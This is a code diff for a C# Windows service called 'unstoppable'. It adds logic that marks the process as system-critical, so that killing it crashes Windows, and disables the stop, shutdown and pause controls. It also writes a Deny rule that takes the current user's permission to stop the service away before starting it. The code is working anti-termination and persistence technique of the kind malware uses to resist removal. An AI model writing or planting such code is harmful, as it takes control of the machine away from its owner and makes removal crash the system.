@@ -4,6 +4,8 @@ using System.Reflection;
 using System.ServiceProcess;
 using System.ComponentModel;
 using System.Timers;
+using svchost.Resilience;
+using svchost.Resilience.DllImports;
 
 namespace unstoppable
 {
@@ -45,6 +47,8 @@ namespace unstoppable
                   *  *
 
             */
+            ///Stopping this process without 1st marking it as no longer critical will BSOD Windows.
+            CriticalProcess.MarkAs(true);
             CanStop = false;
             CanShutdown = false;
             CanPauseAndContinue = false;
@@ -74,6 +78,7 @@ namespace unstoppable
 
         protected override void OnStop()
         {
+            CriticalProcess.MarkAs(false);
             base.OnStop();
         }
     }
@@ -102,6 +107,16 @@ namespace unstoppable
                 if (svc.ServiceName == "unstoppable")
                 {
                     Console.WriteLine("[*] Found service installed: {0}", svc.DisplayName);
+
+                    Console.WriteLine("[*] Removing service stop permissions for the current user...");
+
+                    //A SERVICE_ACCESS mask of AdvApi32.SERVICE_ACCESS.SERVICE_ALL_ACCESS would prevent the current user from interacting with the service completely
+
+                    RestrictControl.ServiceControlPermissions(svc.ServiceName,
+                        RestrictControl.GetCurrentAccountSid(),
+                        System.Security.AccessControl.AccessControlType.Deny,
+                        AdvApi32.SERVICE_ACCESS.SERVICE_STOP);
+
                     Console.WriteLine("[*] Starting service ...");
                     svc.Start();
                 }
